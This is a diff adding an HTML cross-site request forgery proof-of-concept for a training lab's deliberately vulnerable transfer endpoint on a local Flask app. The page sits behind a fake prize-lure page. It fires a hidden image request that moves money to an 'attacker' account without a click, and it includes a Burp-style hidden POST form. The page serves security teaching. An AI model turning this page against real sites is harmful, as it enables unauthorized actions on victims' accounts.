@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Congratulations! Claim your free gift card</title>
+</head>
+<body>
+    <!--
+        CSRF proof-of-concept for the OWASP Vulnerability Assessment Platform
+        "vulnerable-transfer" lab endpoint.
+
+        How to demo it:
+        1. In one browser tab, log in to the app and open /modules/csrf so a
+           session cookie is set.
+        2. Open THIS file directly from disk (double-click it, or serve it
+           from a different port, e.g. `py -m http.server 8000`) so it is a
+           different origin from the Flask app - that is what makes it a
+           cross-site request.
+        3. Watch the victim's wallet balance on /modules/csrf before and
+           after loading this page.
+
+        Two vectors are included:
+        - An <img> tag that fires a GET request. The vulnerable endpoint
+          accepts GET for a state-changing action (itself a bug), and GET
+          top-level/subresource requests still carry the session cookie even
+          under the browser's default SameSite=Lax policy, so this works
+          with zero user interaction.
+        - An auto-submitting hidden POST form (the same shape Burp Suite's
+          "Generate CSRF PoC" feature would produce). Some browsers hold back
+          the session cookie on a cross-site POST under SameSite=Lax, so keep
+          this as the secondary vector / talking point about SameSite as a
+          partial CSRF mitigation.
+
+        Change APP_ORIGIN below if the Flask app is not on the default
+        127.0.0.1:5000, and change AMOUNT/TARGET to whatever you want to show.
+    -->
+    <script>
+        const APP_ORIGIN = "http://127.0.0.1:5000";
+        const TARGET_USERNAME = "attacker";
+        const AMOUNT = "500";
+    </script>
+
+    <h1>You just won a prize! Loading...</h1>
+
+    <!-- Vector 1: GET via <img> - fires immediately, no click needed. -->
+    <img alt=""
+         style="display:none"
+         src="">
+    <script>
+        document.currentScript.previousElementSibling.src =
+            `${APP_ORIGIN}/modules/csrf/vulnerable-transfer?to=${TARGET_USERNAME}&amount=${AMOUNT}`;
+    </script>
+
+    <!-- Vector 2: auto-submitting hidden POST form (Burp-style CSRF PoC). -->
+    <form id="csrf-form" method="POST" style="display:none">
+        <input type="hidden" name="to" value="attacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+    <script>
+        document.getElementById("csrf-form").action =
+            `${APP_ORIGIN}/modules/csrf/vulnerable-transfer`;
+        // Uncomment to also fire the POST vector automatically:
+        // document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
